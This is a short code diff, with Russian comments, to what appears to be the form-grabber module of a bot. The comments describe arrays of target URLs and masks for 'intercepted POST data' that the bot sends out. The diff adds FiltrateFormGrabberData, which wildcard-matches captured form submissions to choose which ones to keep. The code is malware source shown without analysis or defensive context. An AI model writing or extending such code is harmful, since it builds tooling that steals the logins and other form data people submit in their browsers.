@@ -17,13 +17,17 @@
 //****************************************************
 //  Массив URL адресов с которых бот будет отправлять
 //  данные HTML форм.
-//  Массив нольтерменированных строк конечная граница
-//  которого определяется по пустой строке:
-//  Str1\0\Str2\0\Str3\0\0
 //****************************************************
-char FGR_URL_FILTERS[FGR_FILTERS_MAX_FILTERS_SIZE] = "FGR_URL_FILTERS\0";
-
+char FGR_URL_FILTERS[FGR_FILTERS_MAX_FILTERS_SIZE] = "FGR_URL_FILTERS\0\0";
 #define FGR_URL_FILTERS_HASH 0xBB05876C /* FGR_URL_FILTERS */
+
+
+//****************************************************
+//  Массив масок перехватываемых пост данных
+//****************************************************
+char FGR_PARAMS_FILTERS[FGR_FILTERS_MAX_PARAMS_FILTERS_SIZE] = "FGR_PARAMS_FILTERS\0\0";
+#define FGR_PARAMS_FILTERS_HASH 0xBE738607 /* FGR_PARAMS_FILTERS */
+
 
 // Максимальный размер фильтра в массиве
 DWORD FGR_FILTERS_MAX_FILTER_LEN = 0;
@@ -107,6 +111,30 @@ bool FiltrateFormGrabberURL(PCHAR URL)
     return Result;
 }
 //---------------------------------------------------------------------
+
+
+//-------------------------------------------------
+//  FiltrateFormGrabberData - функция возвращает
+//  	истину если данные прошли фильтрацию
+//-------------------------------------------------
+bool FiltrateFormGrabberData(const char* Data)
+{
+	if (AnsiStr::IsEmpty(Data))
+		return false;
+
+	TStrEnum E(FGR_PARAMS_FILTERS, true, FGR_PARAMS_FILTERS_HASH);
+
+	if (E.IsEmpty())
+		return true;
+
+	while (E.Next())
+	{
+		if (WildCmp((char*)Data, E.Line().t_str()))
+            return true;
+	}
+		
+    return false;
+}
 
 
 
